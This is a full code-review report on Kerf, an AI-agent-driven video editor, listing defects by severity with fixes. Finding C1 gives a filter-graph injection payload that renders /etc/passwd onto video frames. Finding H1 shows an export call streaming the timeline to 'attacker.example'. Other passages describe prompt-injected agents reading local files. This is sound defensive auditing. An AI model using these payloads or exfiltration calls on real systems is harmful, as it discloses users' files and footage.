# Kerf — full code review

**Date:** 2026-09-08 · **Base:** `5fc1db8` (main) plus the uncommitted editor-UI WIP
**Scope:** the whole app — `kerf-core` (engine, model, project, analysis), `kerf-app`
(Tauri shell + embedded MCP server), the SvelteKit frontend, and the build/release/CI
infrastructure. ~25.5k lines of Rust, ~15.3k lines of TS/Svelte.

**Method:** eight parallel reviewers, one per layer, each reading the code rather than
inferring from comments. Findings marked **CONFIRMED** were traced end-to-end; several
were additionally reproduced against the real `ffmpeg` binary or by compiling. Findings
marked **PLAUSIBLE** are well-argued but depend on a runtime detail that was not executed.
Every Critical and High item below was independently re-verified against the source
before being written up.

**Baseline (green):** `cargo test --workspace --no-default-features` → 291 passed,
0 failed, 10 ignored. `bun test` → 103 passed across 14 files. `bun run check` →
0 errors, 0 warnings across 4865 files.

---

## Overall assessment

The codebase is in good shape, and unusually so in the places that normally rot. The
domain math in `model.rs` is genuinely hard to fault: every float sort uses
`f64::total_cmp` rather than `partial_cmp().unwrap()`, every division that could produce
`NaN`/`Infinity` is floored or guarded, and every field added to a persisted type carries
`#[serde(default)]` — pinned by a test. Production code contains only 27 `unwrap`/`expect`
calls workspace-wide (the ~570 raw grep hits are almost entirely inside `#[cfg(test)]`
modules), and there are no TODO/FIXME markers, no `{@html}`, no silent `catch {}`, and no
stray `console.log` anywhere. Lock discipline in both `mcp.rs` and `lib.rs` is correct at
essentially every site, and holding a lock across an `.await` is structurally impossible
because `std::sync::MutexGuard` is `!Send`. The release/updater workflow — the subtlest
piece of infrastructure here — matches its documentation exactly; every failure path was
traced and none leaves `releases/latest` pointing at a manifest-less release.

The defects cluster in three specific places, and they share a shape: **the boundaries
where a string or a number crosses from an untrusted caller into a subsystem that
interprets it.** Free-text colour fields reach ffmpeg's filter-graph parser unescaped
while the text right next to them is carefully quoted. Caller-supplied paths reach
ffmpeg's output sink, which resolves protocols. Agent staging is guarded by a sequence
number that gets recycled. In each case the safe pattern already exists a few lines away
and simply was not applied uniformly.

| Severity | Count | Where |
|---|---|---|
| Critical | 3 | `engine/cli.rs`, `project.rs` ×2 |
| High | 6 | `engine/cli.rs`, `mcp.rs` ×2, `lib.rs`, `state.svelte.ts` ×2, `audio.ts`, infra ×2 |
| Medium | 16 | spread across all layers |
| Low | 18 | spread across all layers |

---

## Critical

### C1 — Filter-graph injection via unescaped colour fields → arbitrary local file disclosure

**`crates/kerf-core/src/engine/cli.rs:4119, 4138, 4055, 2246, 4517, 3631`** · CONFIRMED,
reproduced against real ffmpeg

Several free-form `String` fields are spliced into a `-filter_complex` value with **no
escaping and no surrounding quotes**, unlike every other filter value in the same file:

```rust
format!("fontcolor={}", o.color)          // cli.rs:4119 — raw
parts.push(format!("boxcolor={bg}"))      // cli.rs:4138 — raw
format!("chromakey={color}:{}:{}", ...)   // cli.rs:4055 — raw
format!(":flags={s}")                     // cli.rs:2246 — raw (scaler)
format!("format={}", fmt.pix_fmt)         // cli.rs:4517 — raw
format!("[gpuse][gpal]paletteuse=dither={dither}[outv]")  // cli.rs:3631 — raw
```

Two lines above the first of these, `text='{}'` goes through `escape_drawtext` **and** is
single-quoted — the safe pattern is literally adjacent. CLAUDE.md documents this exact bug
class having bitten the project before ("an unquoted comma is where the graph parser thinks
the filter ended").

An unescaped comma breaks out of the current filter and starts a new, caller-chosen node in
the same chain. Setting `TextOverlay.color` to:

```
white,drawtext=textfile='/etc/passwd':fontcolor=red:fontsize=8:x=0:y=0
```

injects a second `drawtext` that renders an arbitrary local file's contents onto every
exported and previewed frame. Reproduced end-to-end with ffmpeg 4.4.2 — a 323-byte blank
control frame versus a 4866-byte frame carrying the file's text, **exit code 0, no error**.

**Reachability confirmed.** No colour validation exists anywhere in the workspace
(`grep` for `validate_color`/`parse_color` returns nothing); `pub color: String` is
free-form on both `TextOverlay` (`model.rs:991`) and `VideoEffect::ChromaKey`.
`validate_video_effect` (`project.rs:2975`) checks `similarity`/`blend` but its match arm
uses `..` and never looks at `color`. All of these are settable today through the MCP tools
`add_overlay` / `update_overlay` / `set_video_effects`, none of which constrain the string
in their schema, and `ExportOptions.pix_fmt`/`.scaler`/`.gif_dither` arrive as a wholesale
deserialized struct from `export`. A shared `.kerf` file is a second vector — the timeline
is one JSON blob loaded without re-validating string fields.

This matters more than a generic injection bug because of Kerf's own threat model: an LLM
reads transcribed speech and on-screen text as context, which is exactly a prompt-injection
surface, and the staging/review design exists precisely because agent edits are not trusted.

**Fix:** quote and escape all six sites the way `text=`/`fontfile=` already are. Better for
the three `ExportOptions` fields, which are closed sets: validate against an allow-list in
`validate_export`, as `video_tunes()` already does for `-tune`.

### C2 — `claim_next_task` attaches a new task's edits to another task's staged session; `fail_task` never cleans up

**`crates/kerf-core/src/project.rs:2228-2251`, `:2258-2260`** · CONFIRMED

```rust
if self.staged_row()?.is_none() {
    self.begin_staging(Some(id), None)?;
}
```

The check asks only *whether* a session exists, never whether it belongs to the task being
claimed. `begin_staging` itself refuses a second session (`Error::StagedEditPending`), but
this call site silently skips it instead of propagating a refusal.

Two deterministic paths, neither needing concurrency:

*Path A* — call `claim_next_task` twice before resolving the first (an ordinary "give me
more work" poll). Task 2 shares task 1's session. `resolve_task(task1)` applies the
**combined** proposal as one revision attributed to task 1 and clears the staged row.
`resolve_task(task2)` then finds nothing staged and marks the task `Done` with none of its
review semantics having run — and if its agent keeps editing, those edits now go straight
to the **live** timeline, unstaged.

*Path B* — the failure path, worse. `fail_task` calls only `set_task_state`; unlike
`resolve_task` (applies) and `remove_task` (discards) it does **neither**, so a failed task
leaves an orphaned session tagged to a now-terminal task. Every subsequent
`claim_next_task` sees `staged_row().is_some()` and folds new work into it, while both
`resolve_task` and `remove_task` guard on `task_id == Some(id)` and so refuse to act. The
task-driven review workflow is then permanently broken for the life of the project, escapable
only by a human noticing the stuck proposal in the generic review UI.

**Fix:** have `claim_next_task` refuse when a session is already open, and give `fail_task`
the same `discard_staged` cleanup `remove_task` has.

### C3 — Staged-edit staleness compares a recycled sequence number, so an ordinary undo-then-edit silently clobbers the user's work

**`crates/kerf-core/src/project.rs:926-940` (`record_revision`), `:1013-1024` (`apply_staged`)** · CONFIRMED

`record_revision` prunes the redo branch and reinserts at the same position:

```rust
let head = self.head()?;
self.conn.execute("DELETE FROM history WHERE seq > ?1", params![head])?;
let seq = head + 1;
```

`restore` (undo/redo/revert) only moves the head pointer and deletes nothing, so `seq`
values are stable identifiers *only* until the next edit branches off an earlier point — at
which point the old row at that `seq` is deleted and a new row with **different content** is
inserted at the same `seq`. But the staleness test is purely numeric:

```rust
if self.head()? != row.base_seq && !force {
    return Err(Error::StagedEditStale);
}
```

Sequence: agent stages at head=5 (content X, stored verbatim in the `staged` table) → user
hits **Undo** → user makes **any** new edit, which deletes the old seq=5 and inserts a new
seq=5 holding content Z → agent calls `apply_staged(false)`. `head() == base_seq == 5`, so
the proposal is **not** flagged stale, and `save_timeline_str(&row.timeline)` overwrites the
live timeline — silently discarding the user's edit. This is the precise scenario the
staleness check exists to prevent, and the trigger is "undo one step, then do something
else" while an agent has a proposal open, which is the documented use case.

**Fix:** compare content, not a recyclable position. The staged row already holds `base` as
literal JSON, so the simplest correct check is `live_timeline_json != row.base`.

---

## High

### H1 — `export` / `export_cover` accept ffmpeg protocol URLs, not just file paths

**`crates/kerf-app/src/mcp.rs:1741-1820`, `:1851-1860`** → **`engine/cli.rs:2613`** · CONFIRMED

`output_path` is taken as an opaque `String` and pushed verbatim as ffmpeg's final output
argument (`args.push(output_path.to_string())`). ffmpeg resolves the output protocol from
the string, so `rtmp://`, `udp://`, `http://` and friends are live sinks on any ordinary
build. `export(output_path="https://attacker.example/upload")` makes Kerf's own ffmpeg
encode the user's timeline and stream it to a remote host, with no local file ever written
to look suspicious — a one-call exfiltration primitive for the whole edit and, transitively,
the source footage.

**Fix:** reject anything containing `://`, or canonicalize and require a local path, before
handing it to the engine.

### H2 — No overwrite guard or destination scoping on any file-writing tool

**`crates/kerf-app/src/mcp.rs:1558-1567` (`export_srt`), `:1741-1820`, `:1851-1860`** · CONFIRMED

None of the three tools that write to a caller-supplied path check whether the destination
exists or restrict it to a sane directory. `export_srt` calls `std::fs::write` directly;
`export`/`export_cover` hand the path to ffmpeg, which overwrites by default. A model that
hallucinates or mis-remembers a path destroys the file at it with no recourse — this is a
plain data-loss risk independent of any adversary.

**Fix:** refuse to overwrite an existing file without an explicit `overwrite: true`, and/or
scope writable destinations to the project folder or a configured exports directory.

### H3 — `escape_drawtext` does not escape `%`, silently blanking any overlay containing one

**`crates/kerf-core/src/engine/cli.rs:4106-4108`** · CONFIRMED, reproduced against real ffmpeg

```rust
fn escape_drawtext(s: &str) -> String {
    s.replace('\\', "\\\\").replace('\n', " ").replace('\'', "'\\''")
}
```

`drawtext` expands `%{...}` at configuration time, and a bare `%` is a configuration error.
Verified: `text='AAAA%BBBB'` logs `Stray % near 'BBBB'` and renders a **completely blank
frame** — byte-identical (323 bytes) to a bare black frame, not even the text before the `%`
— while ffmpeg still **exits 0**. Kerf only surfaces stderr on a non-zero exit, so nothing
reports it.

A user typing `"50% OFF"` or `"Battery: 82%"`, or a transcript containing a percent sign,
gets an overlay that is silently absent from every export and every preview frame, with
nothing in the UI, the history, or the diff explaining why. This is everyday content, not an
edge case.

**Fix:** add `.replace('%', "%%")` — but **only** on the `text=` path. `fontfile=` routes
through the same helper at `cli.rs:4128` and is a raw path not subject to expansion, so
doubling `%` there would corrupt a font path containing one. Split the helper in two.

### H4 — `save_project_as` holds the shared project lock across two disk-bound operations

**`crates/kerf-app/src/lib.rs:186-192`** · CONFIRMED

```rust
let mut project = lock_user(&shared);
project.save_as(&path).map_err(|e| e.to_string())?;
*project = Project::open(&path).map_err(|e| e.to_string())?;
```

The lock is taken *before* a full serialize-and-write and held through a re-parse of the
just-written file. `open_project` immediately above does the opposite, and says so in its own
comment: *"Open the file first, then swap it in — the (disk-bound) open doesn't hold the
shared lock."* For the whole save+reopen window, every GUI command and every MCP tool call
blocks on the same `Arc<Mutex<Project>>` — on a slow filesystem (a network share, an
antivirus-scanned folder, a WSL2 `/mnt/c` path — this project's own dev environment) the app
and the agent both appear hung.

**Fix:** mirror `open_project`'s shape, or at minimum drop the guard between the two calls.

### H5 — `libav-render` does not compile, and CI compiles neither optional ffmpeg feature

**`crates/kerf-core/src/engine/ffmpeg.rs:221, 223, 377, 382`** · CONFIRMED, reproduced

`cargo check -p kerf-core --features libav-render --locked` fails with 4 errors:

```
error[E0271]: type mismatch resolving `<Video as Deref>::Target == Encoder`
error[E0271]: type mismatch resolving `<Audio as Deref>::Target == Encoder`
```

`flush_encoder`'s `DerefMut<Target = Encoder>` bound no longer matches `ffmpeg-next` 9.0's
`Video`/`Audio` wrappers. Root cause is `77b9a05` "Bump ffmpeg-next from 8.1.0 to 9.0.0"
(dependabot, 2026-08-21) — a dependency-only change that never touched the code written
against the 8.1 API, exactly as that module's own doc comment warned it might need.

The systemic half is worse: **every** Rust invocation in `ci.yml` and `release.yml` passes
`--no-default-features`, so neither `ffmpeg` (kerf-core's own default, and the first command
the README suggests to a new contributor) nor `libav-render` is compiled anywhere in CI —
clippy and the MSRV check included. That is how this landed and sat undetected for 2.5 weeks.

**Fix:** repair the bound for the 9.0 API, then add one Linux CI job running
`cargo check -p kerf-core --features libav-render --locked` and `cargo build --workspace
--locked`. This is the single highest-leverage infrastructure fix in the review — it would
have caught the break the day it landed. Also correct the now-stale "ffmpeg-next 8.1"
references in `ffmpeg.rs:10`, `README.md:277`, and CLAUDE.md.

### H6 — Timeline drag has no pointer capture or cancel handling; a lost `pointerup` commits a stale edit on the next unrelated click

**`frontend/src/lib/components/editor/Timeline.svelte:174-260, 385-452, 826`** · CONFIRMED

Clip drag, edge trim, ruler scrub, in/out-mark drag and marker drag are all driven by
`pointerdown` on the target plus **window-level** `pointermove`/`pointerup`. There is no
`setPointerCapture`, no `pointercancel` handler anywhere in `frontend/src` (verified by
grep), and `onPointerMove` never checks `e.buttons`.

Release the button where the webview does not deliver a `pointerup` — outside the OS window,
over a native dialog, on an OS-level drag-cancel, or a mid-drag right-click — and
`drag`/`trimDrag`/`markerDrag` stay non-null with nothing visible saying so. The *next*
`pointerup` anywhere in the app, such as clicking a button in the Inspector, is caught by the
same global handler and treated as the end of the still-open drag, committing a
`move`/trim/marker-move at whatever position that unrelated click happened to be at.

**Fix:** `setPointerCapture` on each pointerdown, an `onpointercancel` (and window `blur`)
reset that clears state without committing, and gate `onPointerMove` on `e.buttons & 1`.

### H7 — `select()` and `refreshTimeline()` have no request-generation guard

**`frontend/src/lib/state.svelte.ts:328-336`, `:338-346`, `:476-491`** · CONFIRMED

Neither commits its result conditionally:

```ts
async select(assetId: string) {
    this.selectedAssetId = assetId;
    this.selectedMetadata = await getAssetMetadata(assetId);   // no staleness check
}
async refreshTimeline() {
    const live = await getTimeline();
    else this.timeline = live;                                  // unconditional
}
```

`select()` is fire-and-forget from six call sites (`MediaBin.svelte:73,97`,
`Timeline.svelte:210,321,332,593`) — all ordinary clicks. Click asset A (large transcript,
slow round trip) then asset B (fast): B lands first and is correct, then A's response
overwrites it while `selectedAssetId` still reads B. The Inspector shows the wrong asset's
specs until reselected.

`refreshTimeline()` is worse because it is triggered by the backend's `project-changed`
event, fired after *every* MCP mutation including a `stage_edits` that touched only the
proposal. If a GUI edit is in flight when that fires and the refresh resolves second, a
stale pre-edit snapshot silently replaces the just-committed result, with nothing re-syncing
afterward. `+page.svelte` coalesces repeated events but does not order a refresh against a
concurrent local edit. Related: `busy` is one shared boolean, so with two overlapping edits
the first to resolve clears it while the other is still running.

**Fix:** stamp a monotonic sequence number when a fetch or edit begins and commit only if it
is still newest on resolution.

### H8 — One decode failure permanently and silently mutes a clip's preview audio

**`frontend/src/lib/audio.ts:71-74, 159-197`** · CONFIRMED

```ts
void this.#buffer(clip).then((buf) => { ... });   // no .catch()
```

If `getAudio()` rejects — a moved file, a transient ffmpeg error, a disk hiccup — three
things happen. It is an **unhandled rejection** (there is no `window.onunhandledrejection`
anywhere in the app), repeated on every `start()`/`resync()`, and `resync()` fires on every
timeline edit made during playback. The cleanup branch `else { this.#cache.delete(key); }`
is never reached, because it only runs after a *successful* resolution — so the **rejected
promise stays in the cache forever**. And `#evict()` only counts entries that are
`instanceof AudioBuffer`, so that dead entry is invisible to eviction too.

Every later playback of that clip/window/effects key returns the same already-rejected
promise. The clip is silently muted in preview for the rest of the session, everything else
keeps playing, and nothing tells the user why.

**Fix:** `.catch()` at the call site, and delete the cache entry (or store `null`) on
rejection so a later attempt retries.

---

## Medium

**Backend / engine**

- **`import_asset` + the vision tools are a file-read path.** `mcp.rs:852-880` probes any
  absolute path with no allow-list (`project.rs:284-330`); `get_frame`/`skim_asset` then ship
  frames of it out as base64 to whatever LLM is on the connection. A prompt-injected agent can
  read files never added to the project. CONFIRMED capability; severity depends on the
  injection foothold, which is a realistic threat model for an app that feeds transcribed
  speech back to a model.
- **`analyze_asset` / `download_speech_model` support neither cancellation nor progress**
  (`mcp.rs:923-941`, `:912-921`) even though `analyze_asset_media_cancellable` exists for
  exactly this, and `export` in the same file threads `RequestContext` correctly.
  `download_speech_model` passes a no-op progress closure, discarding all feedback on a
  multi-hundred-MB download.
- **`ExportOptions` gets none of the clamping the rest of `mcp.rs` applies** (`:647-664`) —
  `resolution: [0,0]` reaches ffmpeg, and the resulting failure is mapped to `internal_error`
  rather than `invalid_params`, telling the model the server is broken when the argument was
  its own.
- **Concurrent speech-model downloads race on one temp file** (`whisper.rs:245-290`). The
  `.part` path is keyed only by PID, so two same-process callers (an explicit
  `download_speech_model` racing an `analyze_asset` transcription step) compute the identical
  path with no lock. The loser calls `verify_ggml` on a path the winner already renamed away
  and fails with "could not read downloaded model" — even though the download succeeded.
- **PID-keying also defeats resume across restarts** (`whisper.rs:260`). A crash mid-download
  leaves a `.part` the next run cannot find (new PID → new path), so it restarts from zero and
  the orphan is never swept — contradicting the documented resume guarantee. The mitigation
  guards the wrong axis of concurrency.
- **A corrupted cached model is trusted forever** (`whisper.rs:257-259`). `verify_ggml` runs
  only against the fresh `tmp`, never against an existing `dst`, and no API forces a
  re-download short of deleting the file by hand.
- **Unbounded revision history** (`project.rs:1013-1024`). Every edit stores a complete
  timeline JSON snapshot, never a diff; the only `DELETE FROM history` is the redo-branch
  prune. Long sessions grow the `.kerf` file without bound.
- **A real export failure leaves the half-written file** (`lib.rs:1349-1374`) — the `?` on
  `render_with_progress` propagates before the `match` that cleans up, which exists only for
  the `Cancelled` branch.
- **`export_cancel`/`analysis_cancel` are single global flags** (`lib.rs:34-41`), not scoped
  per run, so a cancel hits every in-flight run and starting a second run resets the flag,
  swallowing a pending cancel aimed at the first.
- **`set_settings` overwrites `settings.json` with no merge** (`settings.rs:128-135`). Theme
  and layout are independently debounced writes; whichever lands last wins in full, reverting
  the other.
- **`read_text_file`/`write_text_file` take an unvalidated path**, the write side has no size
  cap at all (the read side caps at 1 MiB), and `tauri.conf.json` sets `"csp": null`,
  removing the layer that would contain this if an XSS ever appeared. Defense-in-depth gap
  rather than a proven exploit — no unescaped-HTML sink exists today.
- **GUI-facing `max_width`/`buckets` are unclamped** (`lib.rs:1063-1108`, `:1222-1285`),
  unlike the MCP equivalents, which CLAUDE.md documents as clamped for exactly this reason.
- **`TextOverlay::sample` interpolates unsorted keyframes** (`model.rs:1042`), unlike
  `Clip::transform_at` and `Reframe::sample`, which both call `sorted_keyframes()` with an
  explicit comment that render code must not assume order. Masked today because the only
  mutator sorts first; a hand-edited `.kerf` or a future write path mis-animates silently.

**Frontend**

- **"Restart now" is not gated on unsaved work** (`UpdateDialog.svelte:124`). The warning
  banner above it is correct — `editor.saved` is `currentPath !== null`, and a never-saved
  project genuinely is in-memory only — but the button calls `relaunchApp()` with no
  confirmation, while the dialog **auto-opens** on a newly seen version. One misclick loses
  every asset and edit, and unlike everything else in the app it is not covered by undo.
- **A failed local preset orphans a task** (`AgentPanel.svelte:213-270`). `agent.add(p)`
  creates the row before the precondition check; on failure the catch only toasts, never
  calling `resolve`/`remove`. The card sits in the queue looking normal, and a real MCP agent
  could later claim it.
- **Escape does not cancel a marker rename** (`Timeline.svelte:1094`). Setting
  `renaming = null` unmounts the focused `<input>`; per spec, removing a focused element fires
  `blur`, so `onblur`'s `commitRename` at `:1091` applies the typed text anyway.
- **Modals have no focus trap and the app behind them is not `inert`**
  (`ExportDialog`/`SettingsDialog`/`UpdateDialog`), and `+page.svelte`'s global keydown
  handler has no dialog-open guard. Tab out of an open Export dialog and Space/Delete/J/K/L
  edit the live project underneath it.
- **Closing the export dialog mid-render orphans the export** (`ExportDialog.svelte:230-264`).
  It keeps running invisibly with no progress and no Stop; reopening shows a disabled Export
  button (`editor.busy` still true) with no explanation.
- **The new `fps` getter is not memoized** (`state.svelte.ts:111`, added in the uncommitted
  WIP). `timelineFps` does a nested scan over every track and clip; `editor.fps` is read from
  `Toolbar.svelte:63,113,116` and `Preview.svelte:55,59`, all bound to `ui.time`, which ticks
  every `requestAnimationFrame` during playback. The `duration` getter sitting immediately
  below it is `$derived.by` with a comment explaining exactly this hazard. One-line fix.
- **Numeric setters do not filter `NaN`** (`api.ts` — `setVolume`, `setSpeed`,
  `setTrackVolume`, `setTrackPan`). `Math.min(4, Math.max(0, NaN))` is `NaN`, so the "clamp"
  passes it through; an empty `<input type=number>` yields `NaN`, which serializes to `null`
  and fails deserialization into a required `f32`/`f64`.
- **`settings.svelte.ts` guards only `theme` against a stale response** (`:87-101`);
  `cpuPercent`/`transcribe`/`safeAreas`/`layout` have no equivalent, and `setCpuPercent` has
  no debounce, so two quick preset clicks can land out of order and revert one another.

**Infrastructure**

- **`analysis.rs` has zero tests** despite being trivially mockable — 591 lines containing
  the step ordering, the cancel-between-steps logic, and `default_transcriber`'s backend
  selection, all behind a trait seam already used for fakes.
- **The only CI job driving real ffmpeg runs on Linux only** (`ci.yml`, job `engine`), while
  CLAUDE.md documents Windows-specific behaviour by name: the 32767-character command-line
  cap, the FFmpeg-8 `-/filter_complex` form, and `:`/`\` handling in whisper model paths.
- **The frontend's entire runes-state layer is untested** — every `*.svelte.ts` singleton
  plus `api.ts` and `audio.ts`. The 14 tested files are consistently the pure Rust-mirror
  modules; the orchestration wiring them to the UI has no coverage.
- **`hold-release` has no retry.** A transient `gh release edit` failure reopens the exact
  ~20-minute 404 window the two-job dance exists to close, and a red job is easy to miss in a
  green matrix. The system self-heals when `updater-manifest` runs, but not before.
- **`@xyflow/svelte` is a live runtime dependency with zero imports**, dragging in duplicate
  `runed`/`svelte-toolbelt` versions alongside the newer ones `bits-ui` needs.

---

## Low

Full detail is in the per-layer reports; summarised here.

**Engine / core:** two-pass export leaks passlog temp files when pass 1 fails
(`cli.rs:3153`, asymmetric with pass 2, which always cleans up); cancellation is polled only
per stdout line, so a fully stalled ffmpeg would not see it; `generate_proxy` lacks the
per-key lock `stitch_insta360` has (unreachable at the default `KERF_PROXY_WORKERS=1`); no
upper bound on clip speed lets `atempo_chain` grow very long; `Timeline::captions` inlines
`width/height` instead of calling the guarded `Delivery::aspect()`; the caption dedup only
catches adjacent entries; a "roll" edit renders as `4.0s → 4.0s (+0.0s)` in the diff.

**MCP:** `allowed_origins` is never set, so rmcp's default allows any Origin — currently
unexploitable because the mandatory `Content-Type: application/json` check forces a CORS
preflight the router cannot satisfy, but it is the header actually meant to answer "do I
trust this page", left open by omission while `Host` is carefully hardened; a wildcard
`KERF_MCP_ADDR` disables Host checking with no warning beyond an info log; `export_srt`'s raw
`fs::write` error bypasses `core_err`; the cancel path claims the file "was removed" without
checking; `RenderStatus::Cancelled` is reported as `internal_error`; `clip_ids`/`asset_ids`
have no size ceiling.

**App:** `reveal_path` opens the file rather than its folder for a bare relative filename;
`get_settings`/`set_settings`/`list_fonts` do sync I/O on the shared async runtime; no exit
hook cancels in-flight work; `settings.json` is written non-atomically.

**Project:** the dead `claim_task` bypasses staging entirely if ever wired up;
`insert_or_get_asset` is check-then-insert rather than transactional (safe under the current
single-process lock); no index on `assets.path`; model downloads have no size cap independent
of the server's own `Content-Length`.

**Frontend:** `MediaBin`'s thumbnail cache is at instance scope, not module scope, so its own
comment's claim to survive a re-dock is false; export resolution inputs guard `NaN` but not
negative values; `chunkWords` counts UTF-16 units where `fitSize` counts codepoints
(harness-only); the waveform cache has no cap; playback start/stop errors are swallowed with
`.catch(() => {})`; `Workspace.svelte`'s `restoring` flag is effectively dead code.

**Infra:** unused `@fontsource-variable/inter` and `@internationalized/date`; `csp: null`;
duplicate `base64` versions; `lib.rs` (1814 lines) has no tests; the MCP tool-surface
regression test asserts only `tools.len() > 50` against an ~87-tool surface.

---

## Verified sound

Recorded so these are not re-litigated later. **Lock discipline** — no lock is held across an
`.await` or across the `project-changed` emit anywhere in `mcp.rs` or `lib.rs`; all ~90 Tauri
commands are properly async, none would run on the main thread; poisoning is handled via
`into_inner()`. **The staging read boundary** — no bare `.timeline()` call exists in
`mcp.rs`; `platform_check` resolves through `working_timeline` rather than a second path.
**No SQL injection** — every query is parameterised, including `VACUUM INTO ?1`; edit/apply/
restore are properly transactional with clean rollback; a cancelled analysis caches nothing;
actor attribution cannot leak between GUI and MCP calls. **`Timeline::slice`'s reversed-clip
retrim** — verified algebraically for all four combinations of direction × cut side.
**Keyframe interpolation, angle unwrapping, degenerate salience maps, beat-grid bounds, and
diff id-matching** — all traced and correct. **`types.ts` against the Rust serde structs** —
field-by-field across 23 types, with one intentional, commented divergence and no misnamed
fields or missing variants. **The TS mirrors** (`beats`, `platforms`, `diff`, `smart-crop`,
`captions`) — faithful ports. **No XSS sink** — no `{@html}` or `innerHTML` anywhere; free
text into inline `style` goes through `setAttribute` and cannot break out. **Pipe-deadlock
avoidance and child reaping** in every ffmpeg spawn; `GraphScript` cleans up via `Drop`;
`cpu::lease` reentrancy is correct. **The release workflow** — every failure path traced,
including `hold-release` failing and a matrix leg failing under `fail-fast: false`; signing
keys are scoped to a `release: published` job with no fork exposure; every third-party action
is SHA-pinned; no `pull_request_target`; `MACOSX_DEPLOYMENT_TARGET` matches
`minimumSystemVersion` exactly.

Two ruled out after investigation: the missing `opener:allow-open-path` capability is *not* a
bug (the Rust-side `Opener::open_path` these commands call bypasses Tauri's ACL, which gates
only the JS IPC surface), and the reported `playback_id = 0` sentinel collision is latent
only — `api.ts:420` mints ids with `++playbackSeq`, so the first is 1 and never 0. It is
still worth reserving 0 so a future frontend change cannot reintroduce it.

---

## Suggested order

1. **C1** — escape or allow-list the six filter-graph sites. Smallest fix, largest exposure.
2. **C2, C3** — the staging bugs. Both silently corrupt the user's own work, and C3 triggers
   on an entirely ordinary undo.
3. **H3** — the `%` blanking. Everyday content silently disappearing from exports.
4. **H1, H2** — path validation and an overwrite guard on the three writing tools.
5. **H5** — fix the `libav-render` bound and add the CI job. The job matters more than the
   fix; without it this recurs on the next bump.
6. **H4, H6, H7, H8** — the lock, the pointer state machine, the generation guards, the audio
   catch. Each is contained and independently testable.
7. The Medium list, starting with the ones that lose user work: the unsaved-restart gate, the
   orphaned export on dialog close, and the Escape-commits rename.

Two Medium items are one-liners worth taking immediately: memoizing the `fps` getter
(`$derived.by`, matching `duration` directly below it) and `bun remove @xyflow/svelte`.

---

*Note: the working tree grew during the review — `ExportDialog`, `Timeline`, `MediaBin`,
`Btn`, `IconBtn` and two CSS files were modified after the initial snapshot, consistent with a
concurrent session in the same directory. The baseline suites were re-run against the live
tree and are clean. Line numbers in the frontend component findings were verified against the
tree as of writing.*
